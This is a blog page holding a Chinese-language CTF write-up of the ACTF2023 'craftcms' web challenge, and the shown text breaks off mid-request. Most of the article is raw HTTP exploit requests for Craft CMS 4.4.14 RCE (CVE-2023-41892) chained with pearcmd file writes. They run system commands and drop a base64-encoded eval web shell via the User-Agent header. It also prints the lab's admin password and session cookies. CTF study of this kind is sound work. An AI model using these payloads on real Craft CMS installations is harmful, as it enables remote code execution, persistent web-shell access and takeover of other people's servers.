@@ -1,0 +1,593 @@
+<!DOCTYPE html>
+<html lang="en">
+    <head>
+  <!-- 元数据 -->
+  <meta charset="utf-8">
+  
+  
+  <title>ACTF-Web复现 | ripple</title>
+  <meta name="author" content="rippleQAQ" />
+  <meta http-equiv="Cache-Control" content="no-transform" />
+  <meta http-equiv="Cache-Control" content="no-siteapp" />
+  <meta http-equiv="X-UA-Compatible" content="IE=edge" />
+  <meta name="robots" content="index,follow" />
+  <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1" />
+  <meta name="format-detection" content="telphone=no, email=no" />
+  
+    <meta name="keywords" content="" />
+  
+  <meta name="description" content="ACTF2023-Web复现在学长的输出下，协会web AK了，真是太强了。但是我好菜，没什么作用，痛定思痛，好好复现一下吧。 WebcraftcmsLet’s RCE!!!  根据题目描述可以知道是实现RCE，靶机启动之后是一个Craft CMS的开源项目，顺藤摸瓜去找洞，发现4.4.14版本有两个重要的RCE的洞。 CVE-2023-41892 CraftCMS远程代码执行漏洞分析 | Bmt">
+<meta property="og:type" content="article">
+<meta property="og:title" content="ACTF-Web复现">
+<meta property="og:url" content="https://rippleqaq.github.io/2023/10/30/ACTF2023-Web/index.html">
+<meta property="og:site_name" content="ripple">
+<meta property="og:description" content="ACTF2023-Web复现在学长的输出下，协会web AK了，真是太强了。但是我好菜，没什么作用，痛定思痛，好好复现一下吧。 WebcraftcmsLet’s RCE!!!  根据题目描述可以知道是实现RCE，靶机启动之后是一个Craft CMS的开源项目，顺藤摸瓜去找洞，发现4.4.14版本有两个重要的RCE的洞。 CVE-2023-41892 CraftCMS远程代码执行漏洞分析 | Bmt">
+<meta property="og:locale" content="en_US">
+<meta property="og:image" content="https://rippleqaq.github.io/static/ACTF2023-Web/cms.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/ACTF2023-Web/phpinfo.png">
+<meta property="og:image" content="https://rippleqaq.github.io/static/ACTF2023-Web/version.png">
+<meta property="article:published_time" content="2023-10-29T16:00:00.000Z">
+<meta property="article:modified_time" content="2023-10-29T16:48:37.428Z">
+<meta property="article:author" content="rippleQAQ">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="https://rippleqaq.github.io/static/ACTF2023-Web/cms.png">
+  
+  <!-- 站点验证相关 -->
+  
+    
+    
+    
+  
+  <!-- 样式表文件 -->
+  <link rel="stylesheet" id="kratos-css" href="/css/kratosr.min.css" media="all"></script>
+  
+    <link rel="stylesheet" id="darkmode-css" href="/css/kr-color-dark.min.css" media="(prefers-color-scheme: dark)"></script>
+    <script src="/js/kr-dark.min.js"></script>
+  
+  
+    <link rel="stylesheet" id="highlight-css" href="/css/highlight/night-eighties.min.css" media="all"></script>
+  
+  
+  <link rel="stylesheet" id="fontawe-css" href="/vendors/font-awesome@4.7.0/css/font-awesome.min.css" media="all"></script>
+  <link rel="stylesheet" id="nprogress-css" href="/vendors/nprogress@0.2.0/nprogress.css" media="all"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/aplayer@1.10.1/dist/APlayer.min.css"></script>
+  
+  
+    <link rel="stylesheet" href="/vendors/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.css"></script>
+  
+  <!-- 不得不预先加载的一些JS文件 -->
+  <script src="/vendors/jquery@3.6.0/dist/jquery.min.js"></script>
+  
+    <script src="/vendors/qrcode_js@1.0.0/qrcode.min.js"></script>
+  
+  
+  <style>
+    
+      .kratos-cover.kratos-cover-2 {
+        background-image: url('/images/banner.webp');
+      }
+    
+    
+      @media(min-width:768px) {
+        body.custom-background {
+          background-image: url('/images/bg.webp');
+        }
+      }
+    
+  </style>
+  
+<meta name="generator" content="Hexo 5.4.2"></head>
+
+
+    <body class="custom-background">
+        <div id="kratos-wrapper">
+    <div id="kratos-page">
+        <div id="kratos-header">
+            <header id="kratos-desktop-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="nav-header">
+                        <nav id="kratos-menu-wrap">
+                            <ul id="kratos-primary-menu" class="sf-menu">
+                                
+                                    
+                                    
+                                        
+                                            <li><a href="/"><i class="fa fa-home"></i>首页</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/archives/"><i class="fa fa-file"></i>档案馆</a></li>
+                                        
+                                    
+                                        
+                                            <li><a href="/friends/"><i class="fa fa-paw"></i>好伙伴</a></li>
+                                        
+                                    
+                                
+                            </ul>
+                        </nav>
+                    </div>
+                </div>
+            </header>
+            <header id="kratos-mobile-topnav" class="kratos-topnav">
+                <div class="container">
+                    <div class="color-logo"><a href="/">ripple</a></div>
+                    <div class="nav-toggle">
+                        <a class="kratos-nav-toggle js-kratos-nav-toggle">
+                            <i></i>
+                        </a>
+                    </div>
+                </div>
+            </header>
+        </div>
+        <div class="kratos-start kratos-hero-2">
+            <!-- <div class="kratos-overlay"></div> -->
+            <div class="kratos-cover kratos-cover-2 text-center">
+                <div class="desc desc2 animate-box">
+                    <a href="/">
+                        <h2>ripple</h2> <br />
+                        <span></span>
+                    </a>
+                </div>
+            </div>
+        </div>
+
+        <div id="kratos-blog-post">
+            <div class="container">
+                <div id="main" class="row">
+                    
+
+        
+
+            <section class="col-md-8">
+
+        
+
+            <article itemscope itemtype="https://schema.org/Article">
+    
+    <link itemprop="mainEntityOfPage" href="https://rippleqaq.github.io/2023/10/30/ACTF2023-Web/">
+    <div class="kratos-hentry kratos-post-inner clearfix">
+        <header class="kratos-entry-header">
+            
+                <h1 class="kratos-entry-title text-center" itemprop="name headline">ACTF-Web复现</h1>
+            
+            
+            <ul class="kratos-post-meta text-center">
+                <li><time datetime="2023-10-29T16:00:00.000Z" itemprop="datePublished"><i class="fa fa-calendar"></i> 2023-10-30</time></li>
+                <li itemprop="author" itemscope itemtype="https://schema.org/Person">
+                    <i class="fa fa-user"></i> 作者 <span itemprop="name">rippleQAQ</span>
+                </li>
+                <li>
+                    <i class="fa fa-edit"></i> 
+                    
+                    
+                        ~12.03K
+                    
+                    字
+                </li>
+                
+            </ul>
+        </header>
+        <div class="kratos-post-content">
+            
+            <div id="expire-alert" class="alert alert-warning hidden" role="alert">
+                <div class="icon"><i class="fa fa-warning"></i></div>
+                <div class="text"><p>本文最后编辑于 <time datetime="1698598117428"></time> 前，其中的内容可能需要更新。</p></div>
+            </div>
+            
+            
+            
+                <div class="kratos-post-inner-toc toc-div-class" >
+                    <ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#ACTF2023-Web%E5%A4%8D%E7%8E%B0"><span class="toc-number">1.</span> <span class="toc-text">ACTF2023-Web复现</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#Web"><span class="toc-number">1.1.</span> <span class="toc-text">Web</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#craftcms"><span class="toc-number">1.1.1.</span> <span class="toc-text">craftcms</span></a></li></ol></li></ol></li></ol>
+                </div>
+            
+            <hr />
+            <div itemprop="articleBody"><h1 id="ACTF2023-Web复现"><a href="#ACTF2023-Web复现" class="headerlink" title="ACTF2023-Web复现"></a>ACTF2023-Web复现</h1><p>在学长的输出下，协会web AK了，真是太强了。但是我好菜，没什么作用，痛定思痛，好好复现一下吧。</p>
+<h2 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h2><h3 id="craftcms"><a href="#craftcms" class="headerlink" title="craftcms"></a>craftcms</h3><p>Let’s RCE!!!</p>
+<p><img src="/static/ACTF2023-Web/cms.png"></p>
+<p>根据题目描述可以知道是实现RCE，靶机启动之后是一个Craft CMS的开源项目，顺藤摸瓜去找洞，发现4.4.14版本有两个重要的RCE的洞。</p>
+<p><a target="_blank" rel="noopener" href="http://www.bmth666.cn/2023/09/26/CVE-2023-41892-CraftCMS%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">CVE-2023-41892 CraftCMS远程代码执行漏洞分析 | Bmth’s blog (bmth666.cn)</a></p>
+<p><a target="_blank" rel="noopener" href="https://forum.butian.net/share/2447">奇安信攻防社区-某cms命令执行绕过分析 (butian.net)</a></p>
+<p>具体就是找到了这两篇文章。</p>
+<p>构造报文读取phpinfo：</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span><span class="punctuation">:</span><span class="number">64298</span></span><br><span class="line">Pragma<span class="punctuation">:</span> no-cache</span><br><span class="line">Cache-Control<span class="punctuation">:</span> no-cache</span><br><span class="line">Upgrade-Insecure-Requests<span class="punctuation">:</span> <span class="number">1</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">118.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>image/apng<span class="punctuation">,</span>*<span class="comment">/*;q=0.8,application/signed-exchange;v=b3;q=0.7</span></span><br><span class="line"><span class="comment">Referer: http://61.147.171.105:53564/index.twig</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.9</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Content-Length: 238</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=conditions/render&amp;test[userCondition]=craft\elements\conditions\users\UserCondition&amp;config=&#123;&quot;name&quot;:&quot;test[userCondition]&quot;,&quot;as xyz&quot;:&#123;&quot;class&quot;:&quot;\\GuzzleHttp\\Psr7\\FnStream&quot;,&quot;__construct()&quot;: [&#123;&quot;close&quot;:null&#125;],&quot;_fn_close&quot;:&quot;phpinfo&quot;&#125;&#125;</span></span><br></pre></td></tr></table></figure>
+
+
+
+<p><img src="/static/ACTF2023-Web/phpinfo.png"></p>
+<p>得到账号和密码：admin/actf2023passW0rdforCraftcms</p>
+<p>点击Go to your control panel登录到后台</p>
+<p><img src="/static/ACTF2023-Web/version.png"></p>
+<p>可以看到版本确实是4.4.14，这里一开始想要利用后面的SSTI的洞，但是发现把Settings给ban了，那就和SSTI（第二篇文章）关系不打了</p>
+<p>在第一篇文章中利用PhpManager.php是写入木马到日志中，然后包含日志实现RCE，可是这个题把日志也给关了</p>
+<p>那该怎么办呢？</p>
+<p>在不久前结束的NewStar2023 Week3中就有一个pearcmd的题目，利用pearcmd实现，那么我们可以直接用pearcmd写一个文件，再去包含。</p>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?+config-create+/&lt;?=phpinfo();?&gt;+/var/www/html/<span class="number">1.</span>php HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span><span class="punctuation">:</span><span class="number">64298</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">118.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Cookie: 627b0ba821a077f475abefb99d7bf1eb_username=d988d1b82d3d85d5075c5ae928e807eaa4df4fa4d57da2b27aecb2e67489293fa%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; __stripe_mid=36c8b14e-9b25-44b7-80a3-7d1afa2868712b596e; CRAFT_CSRF_TOKEN=f74a08742e218d2b7ebdc0dd0b5f097d1d13c6512322156a08d250837bc79cf5a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C795a52796888ae1390846fd599d6b4e5f201af1857dff1b69ce40ed0f81fab89MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C1%22%3B%7D; CraftSessionId=9ae58b9bf26133ac1fe019b5501bd732; 627b0ba821a077f475abefb99d7bf1eb_identity=a33e3b26b3d436d790b0e2dd746c3b1dcd106a29303032517966f215a0703ccca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22y26m_oAygOzqwErWffIy_dLFBJB30RzPPTGTsnwwpf0TwEpOqBKvQ3dwsCLihJd7BGo-1XYoPSeUaUL-ZVsSwwFdYOyfhaxydOm0%5C%22%2Cnull%2C%5C%22cac295178e991253f4aae6f6a861ae46%5C%22%5D%22%2C3600%5D%22%3B%7D; __stripe_sid=07e4088e-31e8-4775-b2aa-fe475979b6eb0a2d8e</span></span><br><span class="line"><span class="comment">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d&gt;shell.php`;?&gt;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Length: 219</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/usr/local/lib/php/pearcmd.php&quot;&#125;]&#125;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?+config-create+/&lt;?=phpinfo();?&gt;+/tmp/<span class="number">1.</span>php HTTP/<span class="number">1.1</span></span><br><span class="line">Host<span class="punctuation">:</span> <span class="number">61.147</span><span class="number">.171</span><span class="number">.105</span><span class="punctuation">:</span><span class="number">64298</span></span><br><span class="line">User-Agent<span class="punctuation">:</span> Mozilla/<span class="number">5.0</span> (Macintosh; Intel Mac OS X <span class="number">10</span>_15_7) AppleWebKit/<span class="number">537.36</span> (KHTML<span class="punctuation">,</span> like Gecko) Chrome/<span class="number">118.0</span><span class="number">.0</span><span class="number">.0</span> Safari/<span class="number">537.36</span></span><br><span class="line">Accept<span class="punctuation">:</span> text/html<span class="punctuation">,</span>application/xhtml+xml<span class="punctuation">,</span>application/xml;q=<span class="number">0.9</span><span class="punctuation">,</span>image/avif<span class="punctuation">,</span>image/webp<span class="punctuation">,</span>*<span class="comment">/*;q=0.8</span></span><br><span class="line"><span class="comment">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span></span><br><span class="line"><span class="comment">Accept-Encoding: gzip, deflate</span></span><br><span class="line"><span class="comment">Connection: close</span></span><br><span class="line"><span class="comment">Content-Type: application/x-www-form-urlencoded</span></span><br><span class="line"><span class="comment">Cookie: 627b0ba821a077f475abefb99d7bf1eb_username=d988d1b82d3d85d5075c5ae928e807eaa4df4fa4d57da2b27aecb2e67489293fa%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; __stripe_mid=36c8b14e-9b25-44b7-80a3-7d1afa2868712b596e; CRAFT_CSRF_TOKEN=f74a08742e218d2b7ebdc0dd0b5f097d1d13c6512322156a08d250837bc79cf5a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C795a52796888ae1390846fd599d6b4e5f201af1857dff1b69ce40ed0f81fab89MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C1%22%3B%7D; CraftSessionId=9ae58b9bf26133ac1fe019b5501bd732; 627b0ba821a077f475abefb99d7bf1eb_identity=a33e3b26b3d436d790b0e2dd746c3b1dcd106a29303032517966f215a0703ccca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22y26m_oAygOzqwErWffIy_dLFBJB30RzPPTGTsnwwpf0TwEpOqBKvQ3dwsCLihJd7BGo-1XYoPSeUaUL-ZVsSwwFdYOyfhaxydOm0%5C%22%2Cnull%2C%5C%22cac295178e991253f4aae6f6a861ae46%5C%22%5D%22%2C3600%5D%22%3B%7D; __stripe_sid=07e4088e-31e8-4775-b2aa-fe475979b6eb0a2d8e</span></span><br><span class="line"><span class="comment">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d&gt;shell.php`;?&gt;</span></span><br><span class="line"><span class="comment">Upgrade-Insecure-Requests: 1</span></span><br><span class="line"><span class="comment">Content-Length: 219</span></span><br><span class="line"><span class="comment"></span></span><br><span class="line"><span class="comment">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/usr/local/lib/php/pearcmd.php&quot;&#125;]&#125;&#125;</span></span><br><span class="line"><span class="comment"></span></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?+config-create+/&lt;?=system(&quot;ls%20/&quot;);?&gt;+/tmp/rce.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:64298</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: 627b0ba821a077f475abefb99d7bf1eb_username=d988d1b82d3d85d5075c5ae928e807eaa4df4fa4d57da2b27aecb2e67489293fa%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; __stripe_mid=36c8b14e-9b25-44b7-80a3-7d1afa2868712b596e; CRAFT_CSRF_TOKEN=f74a08742e218d2b7ebdc0dd0b5f097d1d13c6512322156a08d250837bc79cf5a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C795a52796888ae1390846fd599d6b4e5f201af1857dff1b69ce40ed0f81fab89MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C1%22%3B%7D; CraftSessionId=9ae58b9bf26133ac1fe019b5501bd732; 627b0ba821a077f475abefb99d7bf1eb_identity=a33e3b26b3d436d790b0e2dd746c3b1dcd106a29303032517966f215a0703ccca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22y26m_oAygOzqwErWffIy_dLFBJB30RzPPTGTsnwwpf0TwEpOqBKvQ3dwsCLihJd7BGo-1XYoPSeUaUL-ZVsSwwFdYOyfhaxydOm0%5C%22%2Cnull%2C%5C%22cac295178e991253f4aae6f6a861ae46%5C%22%5D%22%2C3600%5D%22%3B%7D; __stripe_sid=07e4088e-31e8-4775-b2aa-fe475979b6eb0a2d8e</span><br><span class="line">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d&gt;shell.php`;?&gt;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 219</span><br><span class="line"></span><br><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/usr/local/lib/php/pearcmd.php&quot;&#125;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /?+config-create+/&lt;?=system(&quot;whoami&quot;);?&gt;+/tmp/1.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:64298</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: 627b0ba821a077f475abefb99d7bf1eb_username=d988d1b82d3d85d5075c5ae928e807eaa4df4fa4d57da2b27aecb2e67489293fa%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; __stripe_mid=36c8b14e-9b25-44b7-80a3-7d1afa2868712b596e; CRAFT_CSRF_TOKEN=f74a08742e218d2b7ebdc0dd0b5f097d1d13c6512322156a08d250837bc79cf5a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C795a52796888ae1390846fd599d6b4e5f201af1857dff1b69ce40ed0f81fab89MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C1%22%3B%7D; CraftSessionId=9ae58b9bf26133ac1fe019b5501bd732; 627b0ba821a077f475abefb99d7bf1eb_identity=a33e3b26b3d436d790b0e2dd746c3b1dcd106a29303032517966f215a0703ccca%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_identity%22%3Bi%3A1%3Bs%3A159%3A%22%5B1%2C%22%5B%5C%22y26m_oAygOzqwErWffIy_dLFBJB30RzPPTGTsnwwpf0TwEpOqBKvQ3dwsCLihJd7BGo-1XYoPSeUaUL-ZVsSwwFdYOyfhaxydOm0%5C%22%2Cnull%2C%5C%22cac295178e991253f4aae6f6a861ae46%5C%22%5D%22%2C3600%5D%22%3B%7D; __stripe_sid=07e4088e-31e8-4775-b2aa-fe475979b6eb0a2d8e</span><br><span class="line">User-Agent: &lt;?php `echo PD9waHAgQGV2YWwoJF9QT1NUWyJjbWQiXSk7Pz4=|base64 -d&gt;shell.php`;?&gt;</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">Content-Length: 219</span><br><span class="line"></span><br><span class="line">action=conditions/render&amp;configObject=craft\elements\conditions\ElementCondition&amp;config=&#123;&quot;name&quot;:&quot;configObject&quot;,&quot;as &quot;:&#123;&quot;class&quot;:&quot;\\yii\\rbac\\PhpManager&quot;,&quot;__construct()&quot;:[&#123;&quot;itemFile&quot;:&quot;/usr/local/lib/php/pearcmd.php&quot;&#125;]&#125;&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+
+
+
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 61.147.171.105:64298</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/118.0.0.0 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">Cookie: 627b0ba821a077f475abefb99d7bf1eb_username=d988d1b82d3d85d5075c5ae928e807eaa4df4fa4d57da2b27aecb2e67489293fa%3A2%3A%7Bi%3A0%3Bs%3A41%3A%22627b0ba821a077f475abefb99d7bf1eb_username%22%3Bi%3A1%3Bs%3A5%3A%22admin%22%3B%7D; __stripe_mid=36c8b14e-9b25-44b7-80a3-7d1afa2868712b596e; CRAFT_CSRF_TOKEN=f74a08742e218d2b7ebdc0dd0b5f097d1d13c6512322156a08d250837bc79cf5a%3A2%3A%7Bi%3A0%3Bs%3A16%3A%22CRAFT_CSRF_TOKEN%22%3Bi%3A1%3Bs%3A147%3A%22MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C795a52796888ae1390846fd599d6b4e5f201af1857dff1b69ce40ed0f81fab89MhEjDrAg8IDMylagfZvoep6TajCXqA1i7GO44ORb%7C1%22%3B%7D; CraftSessionId=9ae58b9bf26133ac1fe019b5501bd732; 